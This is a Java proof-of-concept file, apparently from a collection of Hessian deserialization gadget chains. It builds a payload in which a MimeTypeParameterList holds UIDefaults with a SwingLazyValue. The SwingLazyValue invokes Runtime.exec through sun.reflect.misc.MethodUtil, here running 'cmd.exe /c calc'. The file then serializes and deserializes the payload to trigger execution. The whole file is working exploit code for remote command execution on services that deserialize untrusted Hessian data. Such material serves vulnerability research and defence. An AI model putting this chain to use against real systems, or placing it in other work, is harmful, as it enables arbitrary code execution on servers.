package com.test.gadget.toStringBased;

import sun.swing.SwingLazyValue;
import tools.HessianTools;
import tools.ReflectTools;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.io.IOException;
import java.lang.reflect.Method;

public class MimeTypeParameterList_MethodUtil {
    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, IOException, ClassNotFoundException {
        Object payload = getPayload();
        byte[] bytes = HessianTools.hessian2ToStringSer(payload);
        HessianTools.hessianDeser(bytes, "2");
    }


    public static Object getPayload() throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException {
        Method exec = Runtime.class.getDeclaredMethod("exec", String[].class);
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        // 不能直接传入Runtime，会找不到方法，因为要求参数类型为Object
        // hessian>=60最终不能调Runtime，因为反序列化后Runtime变成HashMap了
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke",
                new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{new String[]{"cmd.exe","/c","calc"}}}});

        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("1diot9", swingLazyValue);

        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
        ReflectTools.setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);

        return mimeTypeParameterList;
    }
}
